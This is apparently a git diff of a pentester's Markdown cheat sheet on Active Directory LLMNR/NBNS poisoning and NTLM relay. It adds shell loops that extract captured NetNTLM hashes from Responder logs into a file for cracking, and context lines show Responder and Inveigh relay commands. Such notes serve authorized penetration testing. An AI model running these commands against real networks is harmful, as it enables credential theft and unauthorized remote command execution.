@@ -28,6 +28,19 @@ Responder.py -I eth0 -wrf
 Responder.py -I eth0 -wfFbv
 ```
 
+Extracting unique hashes:
+
+```
+# extract hash names:
+cat /usr/share/responder/logs/*.txt | awk -F'::' '{print $1}' | sort -u
+
+# extract hash contents:
+for hash in $(cat /usr/share/responder/logs/*.txt | awk -F'::' '{print $1}' | sort -u); do echo $hash; grep $(tr -d '$' <<<"$hash") /usr/share/responder/logs/*.txt | tail -1; done
+
+# save hashes in a file for cracking: 
+for hash in $(cat /usr/share/responder/logs/*.txt | awk -F'::' '{print $1}' | sort -u); do grep $(tr -d '$' <<<"$hash") /usr/share/responder/logs/*.txt | tail -1; done  | cut -d':' -f2- | tee hashes.txt
+```
+
 ### PowerShell DNS/LLMNR/mDNS/NBNS poisonning
 
 ```
@@ -119,10 +132,6 @@ TODO
 # launch Relay (as cmd provide launcher command form Empire):
 Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target <ip-to-relay-to> -Command <cmd-to-execute>
 ```
-
-### NetNTLM Relay: IPv6 DNS server impersonation (mitm6)
-
-    https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/
 
 ### Notes
 
